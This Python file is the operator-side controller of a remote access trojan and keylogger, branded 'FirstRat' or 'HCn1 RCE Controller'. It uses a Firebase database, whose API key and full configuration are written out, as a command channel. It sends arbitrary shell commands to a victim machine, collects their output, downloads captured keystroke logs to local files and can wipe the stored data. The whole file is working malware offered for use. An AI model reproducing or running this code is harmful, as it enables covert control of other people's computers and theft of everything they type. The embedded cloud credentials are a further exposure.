import datetime
from colorama import Fore
import pyrebase

class Control:
    def __init__(self):
        self.firebaseConfig = {
            "apiKey": "AIzaSyAsG9YgF27wACWPAJrGhgrLYzHbH9vbGOw",

            "authDomain": "keylogger-8d7ca.firebaseapp.com",

            "projectId": "keylogger-8d7ca",

            "storageBucket": "keylogger-8d7ca.appspot.com",

            "messagingSenderId": "40649690396",

            "appId": "1:40649690396:web:d4988f297998145354fed9",

            "measurementId": "G-9HXCFBHW21",


            "databaseURL": "https://keylogger-8d7ca-default-rtdb.firebaseio.com"

        }
        firebase = pyrebase.initialize_app(self.firebaseConfig)
        self.db = firebase.database()
        self.id = self.CurrentId()
    def CurrentId(self):
        return self.db.child("Current").get().val()["id"]
    def ControlRce(self,command):
        self.db.child("RCE").child(self.id).update({"command":command})
        print("[+] Waiting Update from other side")
        content = self.ContentRCE()
        return content
    def ContentRCE(self):
        while True:
            try:
                returned = self.db.child("RCE").child(self.id).get().val()["returned"]
                if returned == "DefaultNone":
                    raise Exception
                else:
                    self.db.child("RCE").child(self.id).set({"command": "None", "returned": "DefaultNone"})
                    return returned
                    break
            except KeyboardInterrupt:
                return "Aborted"
                break
            except:
                pass
    def ControlLog(self):
        logs = self.db.child("Keylog").child(self.id).get().val()["logs"]
        logs = logs.split("[ENTER]")
        string = ""
        for log in logs:
            string = string + log +"\n"
        self.db.child("Keylog").child(self.id).set({"logs":""})
        start_dt_str = str(datetime.datetime.now())[:-7].replace(" ", "-").replace(":", "")
        file = open(f"Keylog-{start_dt_str}.txt","w+")
        file.write(string)
        file.close()
    def DeleteDataBase(self):
        self.db.child("RCE").remove()
        self.db.child("Keylog").remove()
def splitWorkOverFunctions(command,Session):
    if command == "help":
        menu()
    elif command == "updateId":
        Session = Control()
        func(Session)
    elif command=="delete":
        Session.DeleteDataBase()
    elif command=="fileout":
        Session.ControlLog()
    else:
        print(Session.ControlRce(command))
def menu():
    commands = [
                ["help","showing this message"],
                ["cd","navigate remoted pc (Please Note that you should only add path after cd"],
                ["updateId","move to newest session"],
                ["delete","delete current database"],
                ["fileout","write keylog to pc"],
                ["(any command else)","RCE"]
                ]
    for command in commands:
        print(f"{Fore.GREEN} {command[0]}               {Fore.RESET}{command[1]}")
def func(Session):
    while True:
        print(f"[FirstRat@HCn1 ~] {Fore.LIGHTBLUE_EX}${Fore.RESET} ",end="")
        command = input()
        splitWorkOverFunctions(command,Session)
if __name__=="__main__":
    print("welcome to HCn1 RCE Controller")
    Session = Control()
    func(Session)